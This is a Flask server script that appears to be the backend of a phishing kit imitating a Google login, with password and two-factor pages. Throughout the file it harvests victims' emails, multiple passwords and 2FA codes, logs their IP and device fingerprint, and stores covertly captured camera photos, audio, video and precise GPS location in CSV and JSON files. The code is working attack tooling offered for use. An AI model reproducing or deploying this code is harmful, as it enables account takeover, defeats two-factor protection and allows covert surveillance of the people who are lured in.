from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
import os
from datetime import datetime
import json
import csv
import time
import shutil
import user_agents  # Make sure to install: pip install user-agents

# تحديد المسار الأصلي للبرنامج
# التأكد من عمل المجلدات بشكل صحيح بغض النظر عن مكان التشغيل
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
ROOT_DIR = os.path.dirname(SCRIPT_DIR)  # المجلد الرئيسي google-V3

app = Flask(__name__, template_folder='templates')
# Enable CORS for all origins
CORS(app, resources={
    r"/*": {
        "origins": "*",
        "methods": ["GET", "POST", "OPTIONS"],
        "allow_headers": ["Content-Type", "Authorization"]
    }
})

# Create required directories - استخدام المسارات المطلقة
for directory in ['collected_data', 'upload', 'captured_media', 'archive']:
    os.makedirs(os.path.join(ROOT_DIR, directory), exist_ok=True)

# Create current session filename
CURRENT_SESSION = datetime.now().strftime('%Y%m%d_%H%M%S')
CURRENT_CSV_FILE = os.path.join(ROOT_DIR, f'collected_data/capture_data_{CURRENT_SESSION}.csv')

def archive_old_files():
    # Move old files to archive
    collected_data_dir = os.path.join(ROOT_DIR, 'collected_data')
    archive_dir = os.path.join(ROOT_DIR, 'archive')
    
    for file in os.listdir(collected_data_dir):
        if file.startswith('capture_data_') and file.endswith('.csv'):
            old_path = os.path.join(collected_data_dir, file)
            new_path = os.path.join(archive_dir, file)
            shutil.move(old_path, new_path)

def clean_archive_files(days=30):
    """Delete archived files older than specified days"""
    now = datetime.now()
    archive_dir = os.path.join(ROOT_DIR, 'archive')
    
    try:
        for file in os.listdir(archive_dir):
            file_path = os.path.join(archive_dir, file)
            # Skip if not a file
            if not os.path.isfile(file_path):
                continue
                
            # Get file modification time
            file_time = datetime.fromtimestamp(os.path.getmtime(file_path))
            # Calculate difference in days
            diff_days = (now - file_time).days
            
            # Remove files older than the specified days
            if diff_days > days:
                try:
                    os.remove(file_path)
                    print(f"Deleted old archive file: {file}")
                except Exception as e:
                    print(f"Error deleting {file}: {e}")
    except Exception as e:
        print(f"Error cleaning archive: {e}")

def clean_old_uploads(days=15, max_files=100):
    """Clean old upload files (photos and audio) based on age and count"""
    now = datetime.now()
    upload_dir = os.path.join(ROOT_DIR, 'upload')
    
    try:
        # Get list of upload files with their modification times
        upload_files = []
        for file in os.listdir(upload_dir):
            file_path = os.path.join(upload_dir, file)
            if not os.path.isfile(file_path):
                continue
                
            # Get file modification time
            mod_time = os.path.getmtime(file_path)
            file_time = datetime.fromtimestamp(mod_time)
            
            # Check if file is older than specified days
            diff_days = (now - file_time).days
            if diff_days > days:
                try:
                    os.remove(file_path)
                    print(f"Deleted old upload file: {file} (age: {diff_days} days)")
                except Exception as e:
                    print(f"Error deleting {file}: {e}")
            else:
                upload_files.append((file_path, mod_time))
        
        # If still too many files, delete oldest ones
        if len(upload_files) > max_files:
            # Sort by modification time (oldest first)
            upload_files.sort(key=lambda x: x[1])
            # Delete oldest files exceeding the limit
            for file_path, _ in upload_files[:(len(upload_files) - max_files)]:
                try:
                    os.remove(file_path)
                    print(f"Deleted old upload file: {os.path.basename(file_path)} (exceeds limit)")
                except Exception as e:
                    print(f"Error deleting {file_path}: {e}")
    
    except Exception as e:
        print(f"Error cleaning uploads: {e}")

def save_to_csv(data, data_type):
    timestamp = datetime.now()
    
    # Create file if it doesn't exist
    if not os.path.exists(CURRENT_CSV_FILE):
        with open(CURRENT_CSV_FILE, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(['Timestamp', 'Type', 'Email', 'Password1', 'Password2', 'Password3', '2FA Code', 'Location', 'Media Count'])
    
    # Prepare location link
    location_url = ''
    if all(k in data for k in ['latitude', 'longitude']):
        location_url = 'https://www.google.com/maps?q={},{}'.format(
            data['latitude'],
            data['longitude']
        )
    
    # Prepare data for writing
    row_data = [
        timestamp.strftime('%Y-%m-%d %H:%M:%S'),
        data_type,
        data.get('email', ''),
        data.get('password1', ''),
        data.get('password2', ''),
        data.get('password3', ''),
        data.get('verification_code', ''),
        location_url,
        f"Photos: {data.get('photo_count', 0)}, Audio: {data.get('audio_count', 0)}" if data_type == 'media' else ''
    ]
    
    # Write data
    with open(CURRENT_CSV_FILE, 'a', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(row_data)

def save_to_shared_data(data, data_type=None):
    timestamp = datetime.now()
    
    # Save to CSV
    save_to_csv(data, data_type or 'unknown')
    
    # Update shared file
    shared_file = os.path.join(ROOT_DIR, 'collected_data/shared_data.json')
    current_data = {}
    try:
        with open(shared_file, 'r', encoding='utf-8') as f:
            current_data = json.load(f)
    except:
        pass
    
    # Ensure permissions section exists
    if 'permissions' not in current_data:
        current_data['permissions'] = {
            'camera': False,
            'microphone': False,
            'location': False
        }
    
    # Update data
    if data_type == 'credentials':
        current_data['credentials'] = data
        current_data['last_update'] = timestamp.isoformat()
    elif data_type == 'location':
        current_data['location'] = data
        current_data['last_update'] = timestamp.isoformat()
        current_data['permissions']['location'] = True
    elif data_type == 'media':
        if 'media' not in current_data:
            current_data['media'] = {}
        current_data['media'].update(data)
        current_data['last_update'] = timestamp.isoformat()
    elif data_type == 'permissions':
        # Update permission status
        if 'camera' in data:
            current_data['permissions']['camera'] = data['camera']
        if 'microphone' in data:
            current_data['permissions']['microphone'] = data['microphone']
        if 'location' in data:
            current_data['permissions']['location'] = data['location']
    else:
        current_data.update(data)
    
    # Save to shared file
    with open(shared_file, 'w', encoding='utf-8') as f:
        json.dump(current_data, f, ensure_ascii=False, indent=2)

# Function to collect device information
def get_device_info(request):
    user_agent_string = request.headers.get('User-Agent')
    user_agent = user_agents.parse(user_agent_string)
    
    return {
        'ip_address': request.remote_addr,
        'user_agent': user_agent_string,  # Include full User-Agent
        'location': 'Unknown',  # Default value for location
        'browser': {
            'family': user_agent.browser.family,
            'version': user_agent.browser.version_string
        },
        'os': {
            'family': user_agent.os.family,
            'version': user_agent.os.version_string
        },
        'device': {
            'family': user_agent.device.family,
            'brand': user_agent.device.brand,
            'model': user_agent.device.model,
            'is_mobile': user_agent.is_mobile,
            'is_tablet': user_agent.is_tablet,
            'is_pc': user_agent.is_pc
        },
        'headers': {
            'accept_language': request.headers.get('Accept-Language'),
            'accept_encoding': request.headers.get('Accept-Encoding'),
            'connection': request.headers.get('Connection'),
            'referer': request.headers.get('Referer'),
        },
        'timestamp': datetime.now().isoformat()
    }

def save_device_info(device_info):
    # Create new file for device information
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    captured_dir = os.path.join(ROOT_DIR, 'captured_media')
    device_file = os.path.join(captured_dir, f'device_info_{timestamp}.json')
    
    # Format information neatly
    formatted_info = {
        'timestamp': datetime.now().isoformat(),
        'ip_address': device_info['ip_address'],
        'browser': device_info['browser'],
        'os': device_info['os'],
        'device': {
            'type': 'Mobile' if device_info['device']['is_mobile'] else 'Tablet' if device_info['device']['is_tablet'] else 'PC',
            'family': device_info['device']['family'],
            'brand': device_info['device']['brand'],
            'model': device_info['device']['model']
        },
        'language': device_info['headers']['accept_language'],
        'headers': device_info['headers'],
        # Add additional information formatted like in detailed_info
        'additional_info': {
            'screen_info': {
                'resolution': '[Will be captured from JavaScript]',
                'color_depth': '[Will be captured from JavaScript]'
            },
            'user_agent_string': device_info.get('user_agent', 'Unknown')
        }
    }
    
    # Save information to JSON file
    with open(device_file, 'w', encoding='utf-8') as f:
        json.dump(formatted_info, f, ensure_ascii=False, indent=2)
    
    return formatted_info

@app.route('/')
def index():
    device_info = get_device_info(request)
    formatted_info = save_device_info(device_info)
    # We no longer need save_detailed_info
    
    # Print device information separately
    print("\nDevice Information:")
    print(f"IP Address: {device_info['ip_address']}")
    print(f"Browser: {device_info['browser']['family']} {device_info['browser']['version']}")
    print(f"OS: {device_info['os']['family']} {device_info['os']['version']}")
    print(f"Device: {device_info['device']['family']}")
    if device_info['device']['brand']:
        print(f"Brand: {device_info['device']['brand']}")
    if device_info['device']['model']:
        print(f"Model: {device_info['device']['model']}")
    print(f"Type: {'Mobile' if device_info['device']['is_mobile'] else 'Tablet' if device_info['device']['is_tablet'] else 'PC'}")
    print(f"Language: {device_info['headers']['accept_language']}")
    print("-" * 30)
    
    return render_template('index.html',
                         ip_address=device_info['ip_address'],
                         user_agent=device_info['user_agent'],
                         location=device_info['location'])

@app.route('/submit', methods=['POST', 'OPTIONS'])
def submit():
    if request.method == 'OPTIONS':
        return '', 204
        
    try:
        data = None
        
        try:
            if request.is_json:
                data = request.get_json()
            elif request.form:
                data = request.form.to_dict()
            else:
                raw_data = request.get_data().decode('utf-8')
                data = json.loads(raw_data)
        except Exception as e:
            print(f"Error reading data: {str(e)}")
            return jsonify({
                "status": "error",
                "message": "Error reading data"
            }), 400

        if data:
            # Process and display each piece of data separately
            if 'email' in data:
                print(f"Email: {data['email']}\n")
            
            # التعرف على نوع الطلب مبكراً 
            request_type = data.get('type', '')
            is_verification = request_type == 'verification'
            
            # عرض كلمات المرور فقط إذا لم تكن عملية تحقق
            if not is_verification:
                # Handle multiple passwords with simpler format
                if 'password' in data:
                    print("Password 1: " + data['password'])
                if 'password2' in data:
                    print("Password 2: " + data['password2'])
                if 'password3' in data:
                    print("Password 3: " + data['password3'])
                print()  # Add empty line after passwords
            else:
                # إذا كانت عملية تحقق، نعرض رمز التحقق فقط
                if 'password' in data:
                    print("Password received with verification, ignoring")
            
            if 'verification_code' in data:
                print(f"2FA Code: {data['verification_code']}\n")
            
            if 'device_type' in data:
                print(f"Device Type: {data['device_type']}\n")
            
            # قراءة البيانات الحالية أولا للتأكد من عدم مسح البيانات السابقة
            shared_file = os.path.join(ROOT_DIR, 'collected_data/shared_data.json')
            current_data = {}
            
            try:
                with open(shared_file, 'r', encoding='utf-8') as f:
                    current_data = json.load(f)
                    if 'credentials' not in current_data:
                        current_data['credentials'] = {}
            except Exception as e:
                print(f"Error reading shared data: {e}")
                current_data = {'credentials': {}}
            
            # تحديث البيانات مع الحفاظ على القيم القديمة
            creds = current_data.get('credentials', {})
            
            if 'email' in data:
                creds['email'] = data['email']
            
            if 'device_type' in data:
                creds['device_type'] = data['device_type']
            
            # تحديث كلمات المرور فقط إذا لم تكن عملية تحقق
            if not is_verification:
                # نتعامل مع كلمات المرور بحذر لضمان عدم مسح القيم القديمة
                if 'password' in data and data['password']:
                    # تخزين كلمة المرور الأولى
                    creds['password1'] = data['password']
                    print("Saving password1:", data['password'])
                
                if 'password2' in data and data['password2']:
                    # تخزين كلمة المرور الثانية بشكل منفصل
                    creds['password2'] = data['password2']
                    print("Saving password2:", data['password2'])
                
                if 'password3' in data and data['password3']:
                    creds['password3'] = data['password3']
            else:
                print("Verification request, not updating passwords")
            
            # التعامل مع رمز التحقق بشكل منفصل تماماً
            if 'verification_code' in data and data['verification_code']:
                # حفظ رمز التحقق فقط بدون التأثير على كلمات المرور
                creds['verification_code'] = data['verification_code']
                print("Saving verification_code:", data['verification_code'])
            
            # طباعة البيانات الحالية للتأكد من صحتها
            print("Current credentials data:", creds)
            
            # تحديث البيانات
            current_data['credentials'] = creds
            current_data['last_update'] = datetime.now().isoformat()
            
            # حفظ البيانات
            with open(shared_file, 'w', encoding='utf-8') as f:
                json.dump(current_data, f, ensure_ascii=False, indent=2)
            
            # حفظ البيانات في CSV
            save_data = {
                'email': creds.get('email', ''),
                'password1': creds.get('password1', ''),
                'password2': creds.get('password2', ''),
                'password3': creds.get('password3', ''),
                'verification_code': creds.get('verification_code', ''),
                'device_type': creds.get('device_type', '')
            }
            
            save_to_csv(save_data, 'credentials')
            
            return jsonify({
                "status": "success",
                "message": "Data received successfully"
            })
        
        return jsonify({
            "status": "error",
            "message": "No valid data received"
        }), 400
        
    except Exception as e:
        print(f"\nError in request processing: {str(e)}")
        return jsonify({
            "status": "error",
            "message": f"Error: {str(e)}"
        }), 500

@app.route('/api/capture-photo', methods=['POST'])
def capture_photo():
    if 'photo' in request.files:
        photo = request.files['photo']
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        upload_dir = os.path.join(ROOT_DIR, 'upload')
        photo.save(os.path.join(upload_dir, f'photo_{timestamp}.jpg'))
        
        # تحديث عدد الصور
        photos = len([f for f in os.listdir(upload_dir) if f.startswith('photo_')])
        
        # قراءة البيانات الحالية
        shared_file = os.path.join(ROOT_DIR, 'collected_data/shared_data.json')
        current_data = {}
        try:
            with open(shared_file, 'r', encoding='utf-8') as f:
                current_data = json.load(f)
        except:
            pass
            
        # تأكد من وجود قسم media
        if 'media' not in current_data:
            current_data['media'] = {}
            
        # تحديث البيانات
        current_data['media']['photo_count'] = photos
        current_data['last_update'] = datetime.now().isoformat()
        
        # حفظ البيانات
        with open(shared_file, 'w', encoding='utf-8') as f:
            json.dump(current_data, f, ensure_ascii=False, indent=2)
            
        # حفظ في CSV
        save_to_csv({'photo_count': photos}, 'media')
    
    return jsonify({"status": "success"})

@app.route('/api/record-audio', methods=['POST'])
def record_audio():
    if 'audio' in request.files:
        audio = request.files['audio']
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        upload_dir = os.path.join(ROOT_DIR, 'upload')
        audio.save(os.path.join(upload_dir, f'audio_{timestamp}.wav'))
        
        # تحديث عدد الملفات الصوتية
        audios = len([f for f in os.listdir(upload_dir) if f.startswith('audio_')])
        
        # قراءة البيانات الحالية
        shared_file = os.path.join(ROOT_DIR, 'collected_data/shared_data.json')
        current_data = {}
        try:
            with open(shared_file, 'r', encoding='utf-8') as f:
                current_data = json.load(f)
        except:
            pass
            
        # تأكد من وجود قسم media
        if 'media' not in current_data:
            current_data['media'] = {}
            
        # تحديث البيانات
        current_data['media']['audio_count'] = audios
        current_data['last_update'] = datetime.now().isoformat()
        
        # حفظ البيانات
        with open(shared_file, 'w', encoding='utf-8') as f:
            json.dump(current_data, f, ensure_ascii=False, indent=2)
            
        # حفظ في CSV
        save_to_csv({'audio_count': audios}, 'media')
    
    return jsonify({"status": "success"})

@app.route('/api/record-video', methods=['POST'])
def record_video():
    print("\nVideo upload request received")
    try:
        if 'video' not in request.files:
            print("Error: No video file in request")
            return jsonify({"status": "error", "message": "No video file provided"}), 400
            
        video = request.files['video']
        if not video.filename:
            print("Error: Empty filename")
            return jsonify({"status": "error", "message": "Empty filename"}), 400
            
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        upload_dir = os.path.join(ROOT_DIR, 'upload')
        
        # التأكد من وجود المجلد
        os.makedirs(upload_dir, exist_ok=True)
        
        video_path = os.path.join(upload_dir, f'video_{timestamp}.webm')
        video.save(video_path)
        
        # تحديث عدد ملفات الفيديو
        videos = len([f for f in os.listdir(upload_dir) if f.startswith('video_')])
        
        # قراءة البيانات الحالية
        shared_file = os.path.join(ROOT_DIR, 'collected_data/shared_data.json')
        current_data = {}
        try:
            with open(shared_file, 'r', encoding='utf-8') as f:
                current_data = json.load(f)
        except Exception as e:
            print(f"Error reading shared data: {e}")
            current_data = {}
            
        # تأكد من وجود قسم media
        if 'media' not in current_data:
            current_data['media'] = {}
            
        # تحديث البيانات
        current_data['media']['video_count'] = videos
        current_data['last_update'] = datetime.now().isoformat()
        
        # التأكد من وجود مجلد البيانات
        os.makedirs(os.path.dirname(shared_file), exist_ok=True)
        
        # حفظ البيانات
        with open(shared_file, 'w', encoding='utf-8') as f:
            json.dump(current_data, f, ensure_ascii=False, indent=2)
            
        # حفظ في CSV
        save_to_csv({'video_count': videos}, 'media')
        
        print(f"Video saved successfully: {video_path} (Total videos: {videos})")
        return jsonify({"status": "success", "message": "Video saved successfully"})
        
    except Exception as e:
        print(f"Error processing video upload: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/get-location', methods=['POST'])
def get_location():
    data = request.json
    if data and 'latitude' in data and 'longitude' in data:
        # استخراج الإحداثيات
        latitude = data['latitude']
        longitude = data['longitude']
        
        # بناء بيانات الموقع الكاملة
        location_data = {
            'latitude': latitude,
            'longitude': longitude,
            'accuracy': data.get('accuracy'),
            'altitude': data.get('altitude'),
            'altitudeAccuracy': data.get('altitudeAccuracy'),
            'heading': data.get('heading'),
            'speed': data.get('speed'),
            'timestamp': datetime.now().isoformat()
        }
        
        # Create direct Google Maps link (without @ symbol)
        maps_url = f"https://www.google.com/maps?q={latitude},{longitude}"
        location_data['maps_url'] = maps_url
        
        # قراءة البيانات الحالية
        shared_file = os.path.join(ROOT_DIR, 'collected_data/shared_data.json')
        current_data = {}
        try:
            with open(shared_file, 'r', encoding='utf-8') as f:
                current_data = json.load(f)
        except:
            pass
            
        # تحديث بيانات الموقع
        current_data['location'] = location_data
        
        # تحديث المعلومات الإضافية
        if 'permissions' not in current_data:
            current_data['permissions'] = {}
        current_data['permissions']['location'] = True
        current_data['last_update'] = datetime.now().isoformat()
        
        # حفظ البيانات
        with open(shared_file, 'w', encoding='utf-8') as f:
            json.dump(current_data, f, ensure_ascii=False, indent=2)
            
        # حفظ البيانات في CSV
        save_to_csv(location_data, 'location')
        
        # Print location information separately
        print("\nLocation Information:")
        print(f"Maps URL: {maps_url}")
        print(f"Coordinates: {latitude}, {longitude}")
        print(f"Accuracy: {data.get('accuracy', 'unknown')} meters")
        if data.get('altitude'):
            print(f"Altitude: {data.get('altitude')} meters")
        if data.get('speed'):
            print(f"Speed: {data.get('speed')} m/s")
        print("-" * 30)
        
        return jsonify({
            "status": "success",
            "maps_url": maps_url,
            "coords": f"{latitude}, {longitude}",
            "accuracy": data.get('accuracy', 'unknown')
        })
    return jsonify({"status": "error", "message": "Invalid location data"})

@app.route('/api/permissions', methods=['POST'])
def permissions():
    data = request.json
    if data:
        # قراءة البيانات الحالية
        shared_file = os.path.join(ROOT_DIR, 'collected_data/shared_data.json')
        current_data = {}
        try:
            with open(shared_file, 'r', encoding='utf-8') as f:
                current_data = json.load(f)
        except:
            pass
            
        # تأكد من وجود قسم permissions
        if 'permissions' not in current_data:
            current_data['permissions'] = {}
            
        # تحديث البيانات
        if 'camera' in data:
            current_data['permissions']['camera'] = data['camera']
        if 'microphone' in data:
            current_data['permissions']['microphone'] = data['microphone']
        if 'location' in data:
            current_data['permissions']['location'] = data['location']
            
        current_data['last_update'] = datetime.now().isoformat()
        
        # حفظ البيانات
        with open(shared_file, 'w', encoding='utf-8') as f:
            json.dump(current_data, f, ensure_ascii=False, indent=2)
            
        # حفظ في CSV
        save_to_csv(data, 'permissions')
        
    return jsonify({"status": "success"})

@app.route('/api/browser-info', methods=['POST'])
def browser_info():
    try:
        data = request.get_json()
        print("\nReceived browser info:")
        print("-" * 30)
        
        if 'userAgent' in data:
            print(f"User Agent: {data['userAgent']}")
        if 'screenInfo' in data:
            screen = data['screenInfo']
            print(f"Screen: {screen.get('width')}x{screen.get('height')}px")
            print(f"Color Depth: {screen.get('colorDepth')}")
        if 'language' in data:
            print(f"Language: {data['language']}")
        if 'platform' in data:
            print(f"Platform: {data['platform']}")
        
        print("-" * 30)
        
        # Save browser info data
        save_shared_data = {
            'browser_info': data
        }
        
        save_to_shared_data(save_shared_data)
        
        return jsonify({
            "status": "success",
            "message": "Browser info received"
        })
    except Exception as e:
        print(f"Error in browser info: {str(e)}")
        return jsonify({
            "status": "error",
            "message": str(e)
        }), 500

# إضافة مسار مباشر لصفحة كلمة المرور
@app.route('/password1.html')
def password_page_direct():
    # الحصول على البريد الإلكتروني من الـ URL parameters
    email = request.args.get('email', '')
    device_info = get_device_info(request)
    return render_template('password1.html', email=email)

# إضافة مسار مباشر للتحقق الثنائي
@app.route('/two-factor.html')
def two_factor_direct():
    # الحصول على البريد الإلكتروني من الـ URL parameters
    email = request.args.get('email', '')
    device_info = get_device_info(request)
    return render_template('two-factor.html', email=email)

# إضافة مسار جديد لصفحة كلمة المرور
@app.route('/templates/password1.html')
def password_page():
    # الحصول على البريد الإلكتروني من الـ URL parameters
    email = request.args.get('email', '')
    device_info = get_device_info(request)
    return render_template('password1.html', email=email)

# إضافة مسار جديد للتحقق الثنائي
@app.route('/templates/two-factor.html')
def two_factor():
    # الحصول على البريد الإلكتروني من الـ URL parameters
    email = request.args.get('email', '')
    device_info = get_device_info(request)
    return render_template('two-factor.html', email=email)

if __name__ == '__main__':
    # Initialize and clean up data
    archive_old_files()
    clean_archive_files()
    clean_old_uploads()
    
    # Start the server
    app.run(host='0.0.0.0', port=50005, debug=True)
